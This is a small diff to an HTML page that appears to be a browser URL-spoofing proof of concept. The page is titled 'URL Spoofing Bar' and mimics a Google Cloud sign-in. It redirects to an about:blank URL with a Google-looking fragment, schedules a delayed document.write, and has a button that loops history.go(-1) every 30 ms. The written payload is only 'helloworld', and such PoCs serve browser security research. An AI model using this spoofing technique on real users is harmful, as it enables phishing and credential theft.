@@ -7,7 +7,8 @@
         Sign in googlecloudplatform.accounts.google.com
 </div>
 <script>
-        			        document.location='about:blank#accounts.verylong.google.com.us';   
+        			       var x = document.location='about:blank#accounts.verylong.google.com.us';   
+        setTimeout(function(){x.document.write("helloworld")}, 3000);
 </script>
         </h1>URL Spoofing Bar</h1>
         <input onclick="setInterval(function(){window.history.go(-1)}, 30)" type="button" value="Go to google.com" />
